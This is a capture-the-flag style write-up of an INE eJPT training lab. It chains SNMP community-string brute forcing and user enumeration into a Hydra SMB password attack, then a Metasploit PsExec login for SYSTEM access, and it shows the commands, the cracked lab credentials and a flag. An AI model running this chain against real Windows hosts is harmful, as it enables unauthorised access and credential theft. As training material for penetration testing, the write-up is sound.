# SNMP Enumeration to SMB Exploitation - INE eJPT

INE lab demonstrating cross-protocol attack chaining: SNMP enumeration on UDP 161 leaks Windows usernames, which feed into an SMB brute force, which enables PsExec-based SYSTEM access. SNMP functions as an information disclosure vector, not as the exploitation target.

Target: `demo.ine.local` (Windows)

Attack chain: `SNMP - user list - SMB brute force - PsExec - SYSTEM`

---

## Phase 1 - SNMP Enumeration

### TCP Scan and UDP Detection

```bash
nmap demo.ine.local
nmap -sU -p 161 demo.ine.local
```

Initial TCP scan shows SMB and other services but no SNMP. SNMP requires a separate UDP scan - Nmap does not scan UDP by default.

Port UDP 161 confirmed open - SNMP active.

### Community String Brute Force

```bash
nmap -sU -p 161 --script=snmp-brute demo.ine.local
```

Community strings found:

```
public
private
secret
```

SNMP community strings are equivalent to read-only passwords in plain text. Default strings are routinely left unchanged on misconfigured devices.

### SNMP Walk

```bash
snmpwalk -v 1 -c public demo.ine.local
```

Returns processes, running services, installed software, and system information. Output is large - pipe to a file or use NSE scripts for filtered extraction.

### Full NSE Enumeration

```bash
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
```

Critical finding: Windows local user account list extracted from SNMP MIB data, including `administrator` and `admin`.

---

## Phase 2 - SMB Credential Attack

### Build User List from SNMP Output

```bash
echo "administrator" > users.txt
echo "admin" >> users.txt
```

### Hydra SMB Brute Force

```bash
hydra -L users.txt \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  demo.ine.local smb
```

Credentials recovered:

```
administrator : elizabeth
admin         : elizabeth
```

---

## Phase 3 - Exploitation via PsExec

```bash
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
```

Meterpreter session obtained.

## Flags

```bash
shell
cd C:\
dir
type FLAG1.txt
```

```
a8f5f167f44f4964e6c998dee827110c
```

---

## Key Takeaways

- SNMP runs on UDP 161 and is invisible to TCP-only scans. Always include a targeted UDP scan when TCP enumeration does not reveal a clear attack path.
- Default SNMP community strings (`public`, `private`) are read-only management credentials left unchanged on the majority of misconfigured devices.
- SNMP on Windows leaks the local user account list via MIB OIDs. This converts SNMP read access into a targeted user list for credential attacks on SMB, RDP, or any other service.
- The attack chain is SNMP (information disclosure) - SMB (credential attack) - PsExec (execution). SNMP provides the username input that makes brute force targeted rather than blind.
- Cross-protocol chaining is a core eJPT skill. Services that appear low-priority during initial enumeration often unlock high-impact attacks on adjacent services.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
